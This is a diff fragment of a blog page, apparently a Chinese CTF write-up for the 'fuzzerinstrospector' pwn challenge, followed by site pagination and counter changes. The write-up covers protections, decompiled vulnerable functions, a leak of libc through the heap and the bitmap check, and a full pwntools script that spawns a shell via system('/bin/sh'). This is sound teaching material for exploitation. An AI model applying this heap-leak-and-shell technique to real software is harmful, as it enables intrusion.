class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/exp/fuzzerinstrospector&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<ul>
-<li>64位，dynamically，全开</li>
-</ul>
-<p><strong>入侵思路</strong></p>
-<p>Switch-case 6：有一个任意指针调用，只要泄露出 libc_base 就可以 get shell</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">key</span><span class="params">(<span class="keyword">char</span> *chunk_list)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *code)(<span class="keyword">char</span> *); <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s = <span class="number">0</span>;</span><br><span class="line">  code = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0xCC</span>, <span class="number">0xF0</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;code);</span><br><span class="line">  code(chunk_list);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>先把 tcache 装满，然后通过 unsortedbin 获取 main_arena，接着输入非数字字符使 scanf 写入失败，这样 main_arena 就留在了可控制的 heap 中</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x562cbf64c9c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x562cbf64c9c0</span> ◂— <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x562cbf64c9c8</span> ◂— <span class="number">0x111</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x562cbf64c9d0</span> —▸ <span class="number">0x7f3ef5128ca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x562cbf64cad0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<p>获取 main_arena 需要一点小技巧：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 index; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 <span class="keyword">index_t</span>; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *chunk; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  index = input();</span><br><span class="line">  <span class="keyword">index_t</span> = index;</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    index = chunk_list[index];</span><br><span class="line">    <span class="keyword">if</span> ( index )</span><br><span class="line">    &#123;</span><br><span class="line">      chunk = (<span class="keyword">unsigned</span> __int8 *)chunk_list[<span class="keyword">index_t</span>];</span><br><span class="line">      LODWORD(index) = <span class="built_in">puts</span>(<span class="string">&quot;Bitmap set: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">        LODWORD(index) = <span class="built_in">printf</span>(<span class="string">&quot;Bit: %hhu\n&quot;</span>, chunk[chunk[i] + <span class="number">8</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>chunk-&gt;data 的前8字节会最为 index，使其打印 chunk[index + 8]</li>
-<li>我们只需要让 chunk[index + 8] == index，就可以确定前8字节的值了</li>
-</ul>
-<p>完整 exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./fuzzerinstrospector&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./fuzzerinstrospector&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,bitmap</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Index: &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;: &quot;</span>,<span class="string">&quot;-&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Bitmap: &quot;</span>,bitmap)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,bitmap</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Index: &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Bitmap: &quot;</span>,<span class="built_in">str</span>(bitmap))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">indexindex = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    indexindex += i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    create(i,<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(i,<span class="string">&quot;b&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">7</span>,indexindex)</span><br><span class="line">check(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Bit: &#x27;</span>)</span><br><span class="line">    tmp = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">10</span>)</span><br><span class="line">    leak_addr += tmp&lt;&lt;(i*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr-<span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">onegadget=[<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget=onegadget[<span class="number">2</span>]+libc_base</span><br><span class="line">system_libc = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>[i]).encode())</span><br><span class="line">p.sendafter(<span class="string">&#x27;Bitmap: &#x27;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(system_libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<hr>
-<p><strong>小结：</strong></p>
-<p>题目本身不难，就是打的时候不知道 scanf 写入失败的情况，可惜了</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1859,7 +1963,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">140</span>
+          <span class="site-state-item-count">141</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1908,12 +2012,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">1.8m</span>
+    <span title="Symbols count total">1.9m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">27:45</span>
+    <span title="Reading time total">28:07</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
